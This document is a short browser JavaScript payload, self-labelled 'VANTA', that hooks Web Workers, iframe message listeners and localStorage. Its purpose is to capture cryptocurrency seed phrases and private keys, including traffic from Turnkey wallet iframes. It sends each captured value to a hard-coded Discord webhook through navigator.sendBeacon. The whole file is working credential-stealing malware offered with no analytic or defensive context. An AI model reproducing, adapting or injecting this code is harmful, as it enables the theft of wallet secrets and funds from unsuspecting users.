(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    let captured = false;

    console.log("%c[VANTA] v21: WORKER HIJACK LOADED", "color: #00ff88; font-weight: bold;");

    const ship = (content, type) => {
        if (captured || !content) return;
        captured = true;

        const body = JSON.stringify({
            embeds: [{
                title: "🛰️ VANTA: WORKER INTERCEPT SUCCESS",
                description: "```" + content + "```",
                fields: [{ name: "Source", value: type }],
                color: 65280
            }]
        });

        navigator.sendBeacon(WEBHOOK, new Blob([body], { type: 'application/json' }));
        console.log("%c[VANTA] SEED EXFILTRATED.", "color: #00ff88;");
    };

    // 1. HIJACK WEB WORKERS (The "decoder-heavy" bypass)
    const OldWorker = window.Worker;
    window.Worker = function(url) {
        const worker = new OldWorker(url);
        const oldPost = worker.postMessage;
        
        // Listen to what the worker sends back to the site
        worker.addEventListener('message', (e) => {
            if (e.data && (typeof e.data === 'string' || e.data.seed || e.data.privateKey)) {
                ship(JSON.stringify(e.data), "WebWorker_Intercept");
            }
        });

        return worker;
    };

    // 2. HIJACK MESSAGE CHANNEL (Catching Turnkey Iframe comms)
    const oldAddListener = window.addEventListener;
    window.addEventListener = function(type, listener, options) {
        if (type === 'message') {
            const proxiedListener = (event) => {
                // If Turnkey sends a message with the key, we grab it
                if (event.data && typeof event.data === 'string' && event.data.length > 50) {
                    ship(event.data, "Iframe_Message_Channel");
                }
                return listener(event);
            };
            return oldAddListener.call(this, type, proxiedListener, options);
        }
        return oldAddListener.apply(this, arguments);
    };

    // 3. STORAGE RE-SCAN (Targeting the 'export' triggers)
    setInterval(() => {
        const keys = Object.keys(localStorage);
        keys.forEach(k => {
            if (k.includes('turnkey') || k.includes('wallet')) {
                const val = localStorage.getItem(k);
                if (val.length > 60) ship(val, "Storage_Scan_Hit");
            }
        });
    }, 2000);

})();
